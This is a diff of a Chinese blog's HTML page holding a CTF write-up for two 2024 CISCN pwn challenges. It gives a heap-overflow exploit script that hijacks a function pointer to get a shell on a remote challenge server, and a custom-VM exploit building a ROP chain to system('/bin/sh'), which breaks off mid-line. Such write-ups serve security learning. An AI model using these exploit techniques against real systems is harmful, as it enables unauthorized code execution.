@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="pwn-anote32位程序，存在后门函数。   粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。     这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入">
+        <meta name="description" content="pwn-anote32位程序，存在后门函数。  粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。   这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入一个函">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2024ciscn&amp;长城杯初赛pwn方向部分题解">
 <meta property="og:url" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/index.html">
 <meta property="og:site_name" content="Collectcrop&#39;s Blog">
-<meta property="og:description" content="pwn-anote32位程序，存在后门函数。   粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。     这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入">
+<meta property="og:description" content="pwn-anote32位程序，存在后门函数。  粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。   这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入一个函">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215182951906.png">
 <meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215183554444.png">
@@ -716,7 +716,6 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215182951906.png"
                       class=""
                 >
-
 <p>粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。</p>
 <img  
                      lazyload
@@ -724,14 +723,12 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215183554444.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215184559047.png"
                       class=""
                 >
-
 <p>这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入一个函数指针，结合反编译代码不难发现，这个调用的函数指针实际是用来打印<code>work done</code>的，这里我们如果能劫持这个指针到backdoor，就能getshell。</p>
 <img  
                      lazyload
@@ -739,14 +736,12 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185453342.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185705572.png"
                       class=""
                 >
-
 <p>然后看看edit一些参数的限制，其中长度最多为40，但这个长度已经足以进行堆溢出，覆盖到下一个chunk的data域了，那么就可以直接把函数指针给改了。这里的函数指针是二级指针，所以还不能直接填进去backdoor函数的地址，由于gift给了堆上的地址了，那么我们就能先在堆的某个位置填入backdoor地址，然后劫持的函数指针指向该地址处。最后edit触发一下，然后就有shell了。</p>
 <img  
                      lazyload
@@ -754,25 +749,19 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185800640.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190233099.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201646774.png"
                       class=""
                 >
-
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./note&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.95.214.102&quot;</span>,<span class="number">20609</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">backdoor = <span class="number">0x80489CE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():       <span class="comment">#max 9</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):     <span class="comment">#size&lt;40,触发函数指针</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;len&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">9</span>),<span class="number">16</span>)-<span class="number">0x5fc8</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">28</span>,p32(backdoor)*<span class="number">5</span>+p32(<span class="number">0x21</span>)+p32(heap_base+<span class="number">0x5fd0</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">10</span>,<span class="string">b&quot;abcd&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-
 <h4 id="pwn-avm"><a href="#pwn-avm" class="headerlink" title="pwn-avm"></a>pwn-avm</h4><p>VMpwn，首先要逆出其中每个指令的含义，以及自定义指令的构成。</p>
 <p>首先主函数可以读取0x300字节的输入，然后进initial函数进行初始化。具体是往opt+0x100地址之后填一些控制信息，然后再把前面的位置都置空。</p>
 <img  
@@ -781,14 +770,12 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190920906.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191043445.png"
                       class=""
                 >
-
 <p>经过动态调试，最后逆出的opt结构大概是这样，0x108处存我们的输入，也就是具体的指令，0x100处存目前指令的偏移（从后面动调看出），0x110处存最大的指令偏移。</p>
 <img  
                      lazyload
@@ -796,7 +783,6 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191015846.png"
                       class=""
                 >
-
 <p>然后看最重要的parse函数，首先v2里存了我们的选项，后面函数表中总共有10种不同的指令，注意到这里最后向右移位了0x1C，所以我们实际的指令种类是存在左移位0x1C处的。</p>
 <img  
                      lazyload
@@ -804,7 +790,6 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192127742.png"
                       class=""
                 >
-
 <p>第一个函数如下：</p>
 <img  
                      lazyload
@@ -812,7 +797,6 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192643849.png"
                       class=""
                 >
-
 <p>第二个函数如下:</p>
 <img  
                      lazyload
@@ -820,7 +804,6 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192712698.png"
                       class=""
                 >
-
 <p>第三个函数如下：</p>
 <img  
                      lazyload
@@ -828,8 +811,7 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192739108.png"
                       class=""
                 >
-
-<p>看了三个具体指令的实现，我们观察到只有最后赋值后面的运算符发生了变化，然后我们就可以猜测其具体就是分别实现了add，sub，mul的功能，以此类推，就能得到前八个函数的大体作用。这里其实我们能看到opt前面0x100个字节分成了32个8字节，分别模拟了32个寄存器，我们的内容都是存在模拟寄存器中，前面8个函数也都只能对模拟寄存器做操作。实际上由于前面把这0x100个字节置空，所以直接调用前面这8个指令，得到的结果永远都是0。还有一点就是发现每个指令都会把opt偏移0x100处累加四，这说明每个指令都占用四个字节长度（逻辑上如此，而实际上后面分析也的确如此）。我们最多可以连续写0x300&#x2F;0x4&#x3D;0xc0个指令。</p>
+<p>看了三个具体指令的实现，我们观察到只有最后赋值后面的运算符发生了变化，然后我们就可以猜测其具体就是分别实现了add，sub，mul的功能，以此类推，就能得到前八个函数的大体作用。这里其实我们能看到opt前面0x100个字节分成了32个8字节，分别模拟了32个寄存器，我们的内容都是存在模拟寄存器中，前面8个函数也都只能对模拟寄存器做操作。实际上由于前面把这0x100个字节置空，所以直接调用前面这8个指令，得到的结果永远都是0。还有一点就是发现每个指令都会把opt偏移0x100处累加四，这说明每个指令都占用四个字节长度（逻辑上如此，而实际上后面分析也的确如此）。我们最多可以连续写0x300/0x4=0xc0个指令。</p>
 <p>第9个和第10个函数稍微有点不同：</p>
 <img  
                      lazyload
@@ -837,14 +819,12 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193045374.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193103501.png"
                       class=""
                 >
-
 <p>直接看有点摸不着头脑，只知道a2是一个栈上的缓冲区，我们后面动态调试的时候就会发现，这里第9个实际上能够往该缓冲区中写一个前面模拟寄存器的值，其偏移最多为0xFFF；而第十个函数可以从缓冲区偏移最多0xFFF处，读取一个值到我们的模拟寄存器。这里的<code>(HIWORD(v3) &amp; 0xFFF)</code>实际上相当于一个立即数，代表偏移。之后我们的指令表大概就恢复完成了。</p>
 <img  
                      lazyload
@@ -852,7 +832,6 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192212512.png"
                       class=""
                 >
-
 <p>下一个问题是指令的具体组成，比如我们想用write_reg往偏移为25的模拟寄存器存缓冲区偏移0xd38的内容，那么我们可以在汇编的具体执行过程中进行分析。逐渐调试就能得到<code>payload = p32((10&lt;&lt;0x1c)+(tarreg&amp;0x1f)+((reg1&amp;0x1f)&lt;&lt;5)+((num&amp;0xfff)&lt;&lt;16))</code>。也就是说指令类型左移位0x1c，存储结果寄存器在最低位（且不超过31），一个被当作偏移的寄存器序号在左移位5位处，立即数在左移位16位处。</p>
 <img  
                      lazyload
@@ -860,10 +839,8 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215194053168.png"
                       class=""
                 >
-
 <p>然后就能还原出每一个指令的组成结构：</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">1</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">2</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">3</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">4</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">5</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">6</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">7</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">8</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">    payload = p32((<span class="number">9</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">     payload = p32((<span class="number">10</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
 <p>之后的问题就是要从栈上已有的固定的内容，读取到模拟寄存器中，这里我们在动态调试时，能够看到缓冲区的起始地址，也就是加上我们的立即数偏移这个位置。这里如果我们最后所有指令结束后，parse函数返回时，就会到偏移0x118位置。我们想要算出gadget和system等相关于libc的地址，所以要获取libc基址。这里能在0xd38偏移位置找到，而且这个是前面栈帧所遗留的，不会在每次程序执行时变化。同时我们还能在这个libc相关地址上面获取到一个1，将他们存到模拟寄存器中。</p>
 <img  
                      lazyload
@@ -871,25 +848,21 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195205194.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195328605.png"
                       class=""
                 >
-
-<p>后面就是要先算出libc基址，然后得到ret，pop_rdi_ret，&#x2F;bin&#x2F;sh字符串以及system的地址。这里直接自己找栈上的内容，然后一点一点手动构造出来显然不是很现实。然后发现距离libc_base偏移最多的&#x2F;bin&#x2F;sh字符串地址的偏移为0x1d8678。换算成二进制，大概要用21个二进制位，不过我们模拟寄存器位充足，最后我用寄存器模拟了23个二进制位。这样我们可以用模拟寄存器的线性组合表示出任何我们想要的偏移。</p>
+<p>后面就是要先算出libc基址，然后得到ret，pop_rdi_ret，/bin/sh字符串以及system的地址。这里直接自己找栈上的内容，然后一点一点手动构造出来显然不是很现实。然后发现距离libc_base偏移最多的/bin/sh字符串地址的偏移为0x1d8678。换算成二进制，大概要用21个二进制位，不过我们模拟寄存器位充足，最后我用寄存器模拟了23个二进制位。这样我们可以用模拟寄存器的线性组合表示出任何我们想要的偏移。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215200035859.png"
                       class=""
                 >
-
 <p>具体组合实现：</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_addr</span>(<span class="params">offset,tar</span>):</span><br><span class="line">    binary = <span class="built_in">bin</span>(offset)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    payload = add(tar,<span class="number">31</span>,<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)):</span><br><span class="line">        <span class="keyword">if</span> binary[i]==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            payload += add(tar,tar,i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload =  write_reg(<span class="number">25</span>,<span class="number">0</span>,<span class="number">0xd38</span>) + write_reg(<span class="number">0</span>,<span class="number">31</span>,<span class="number">0xd30</span>)+add(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)+add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)+add(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)+add(<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)+add(<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>)+add(<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">7</span>,<span class="number">6</span>,<span class="number">6</span>)+add(<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>)+add(<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>)+add(<span class="number">10</span>,<span class="number">9</span>,<span class="number">9</span>)+add(<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>)+add(<span class="number">12</span>,<span class="number">11</span>,<span class="number">11</span>)+add(<span class="number">13</span>,<span class="number">12</span>,<span class="number">12</span>)+add(<span class="number">14</span>,<span class="number">13</span>,<span class="number">13</span>)+add(<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>)</span><br><span class="line">payload += add(<span class="number">16</span>,<span class="number">15</span>,<span class="number">15</span>)+add(<span class="number">17</span>,<span class="number">16</span>,<span class="number">16</span>)+add(<span class="number">18</span>,<span class="number">17</span>,<span class="number">17</span>)+add(<span class="number">19</span>,<span class="number">18</span>,<span class="number">18</span>)+add(<span class="number">20</span>,<span class="number">19</span>,<span class="number">19</span>)+add(<span class="number">21</span>,<span class="number">20</span>,<span class="number">20</span>)+add(<span class="number">22</span>,<span class="number">21</span>,<span class="number">21</span>)+add(<span class="number">23</span>,<span class="number">22</span>,<span class="number">22</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29d90</span>,<span class="number">24</span>)</span><br><span class="line">payload += sub(<span class="number">25</span>,<span class="number">25</span>,<span class="number">24</span>)		<span class="comment">#get libc_base，saved in 25</span></span><br><span class="line">payload += make_addr(<span class="number">0x29139</span>,<span class="number">24</span>) + add(<span class="number">29</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">29</span>,<span class="number">31</span>,<span class="number">0x118</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x2a3e5</span>,<span class="number">24</span>) + add(<span class="number">26</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">26</span>,<span class="number">31</span>,<span class="number">0x120</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x1d8678</span>,<span class="number">24</span>) + add(<span class="number">27</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">27</span>,<span class="number">31</span>,<span class="number">0x128</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x50D70</span>,<span class="number">24</span>) + add(<span class="number">28</span>,<span class="number">24</span>,<span class="number">25</span>) + 